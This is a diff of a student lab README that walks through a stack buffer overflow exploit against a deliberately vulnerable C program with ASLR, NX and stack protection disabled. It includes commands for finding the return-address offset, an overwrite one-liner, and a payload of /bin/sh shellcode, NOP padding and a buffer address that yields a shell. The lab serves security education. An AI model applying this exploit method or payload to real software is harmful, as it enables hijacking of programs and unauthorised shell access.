@@ -1,17 +1,17 @@
 # Lab3 - Buffer overflow attack(turn off ASLR, turn off NX)
 
-## What are we going to do?
-This example shows that after calling strcpy function, just exiting the program not returning to the point it was called.
-To do that, we need to overwrite the return address exploit the strcpy function.
+## Overview
+This example shows how to find the return address location of strcpy using buffer overflow.
+After finding out where it is, overwrite the return address with a address where we want to jump(What if the jump address is a program getting a shell!!)
 
-## Overview of process 
+## Steps
 1. Set an address you want to jump. In this example, we just want to find out the address where the program exit immediately. Later on, this address will be the address you want to execute!!
 2. Find where the strcpy return address is.(It's a brute force method)
 3. And then, run the c program with a parameter containing the address where you want to jump.(We are going to use the address from the Step1)
 4. Make a payload which include the execution of shell code!!
 5. Place the payload as a parameter of the 'ans_check5'.
 
-## Steps in detail
+## Before get started
 + Preparation. Compile the c program below like this. 
 ```
 gcc -g -z execstack -fno-stack-protector ans_check5.c -o ans_check5
@@ -24,7 +24,9 @@ gcc -g -z execstack -fno-stack-protector ans_check5.c -o ans_check5
 -o : set output file name
 ```
 
-+ Step1. Execute below to find out the address we want to jump. As you can see, 0x080485b3 is the address we want to jump!
+## Step1. Find a exit function in the program
++ In a program, there should be a exit function naturally. We will use this address for later use.
++ Execute below to find out the address we want to jump. As you can see, 0x080485b3 is the address we want to jump!
 ```
 [02/09/22]seed@VM:Byeongchan$ objdump -D ans_check5 | grep -B 1 exit
 
@@ -35,7 +37,9 @@ gcc -g -z execstack -fno-stack-protector ans_check5.c -o ans_check5
 [02/09/22]seed@VM:Byeongchan$
 ```
 
-+ Step2. Find out where the return address of strcpy function is! This is where brute force method comes in! Try like below changing the number of print count. If the program ended without printing 'About to exit!', that means return address was corrupted and the program was killed by the system.
+## Step2. Find out where the return address of strcpy function is! 
++ This is where brute force method comes in! Try like below changing the number of print count. 
++ If the program ended without printing 'About to exit!', that means return address was corrupted and the program was killed by the system.
 ```
 [02/09/22]seed@VM:Byeongchan$ ./ans_check5 $(python -c "print '0'*47")
 ans_buf is at address 0xbf88027c
@@ -48,8 +52,10 @@ Segmentation fault
 
 ```
 
-+ Step3. Run like below. Python code will create meaning-less characters followed by exit return address. That return address will overwrite the return address of strcpy. If the program exit without 'Segmentation fault', then you found the right place!!!
-  + Think about it. Now we know where the return address of strcpy. If we can overwrite return address to a target program address we want to execute, and then we can execute it!
+## Step3. Exit without any other segmentation fault!
++ Python code will create meaning-less characters followed by exit return address. 
++ That return address will overwrite the return address of strcpy. If the program exit without 'Segmentation fault', then you found the right place!!!
++ Think about it. What if we can overwrite return address to a target program address we want to execute?
 ```
 ans_check5 $( python -c "print '\xAA'*48 + '\xb3\x85\x04\x08'") 
 ```
@@ -72,7 +78,7 @@ ans_buf is at address 0xbf97bbdc
 [02/10/22]seed@VM:Byeongchan$ 
 ```
 
-+ Step4. Make a payload. 
+## Step4. Make a payload. 
   + ‘PAYLOAD’ = '<Aligned Shellcode>'+<Safe padding>+'<BUFFER_START_ADDRESS>'
   + Shellcode: It's a execution of /bin/sh and hexacoded.
   + Safe padding: Need it to reach the return address location
@@ -84,7 +90,7 @@ Safe padding: \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x
 BUFFER_START_ADDRESS: \x6c\xfd\xff\xbf
 ```
 
-+ Step5. Place the payload as a parameter of the 'ans_check5'.
+## Step5. Place the payload as a parameter of the 'ans_check5'.
 
   + FIRST, I executed on command line and I got another bash shell!!!!
   + SECOND, using gdb, investigate the content of the stack!!
@@ -123,7 +129,7 @@ Breakpoint 2, 0x0804855b in check_answer (ans=0xbfffff00 "\031")
 (gdb)
 ```
 
-# ans_check5.c
+## ans_check5.c
 ```
 #include <stdio.h>
 #include <stdlib.h>
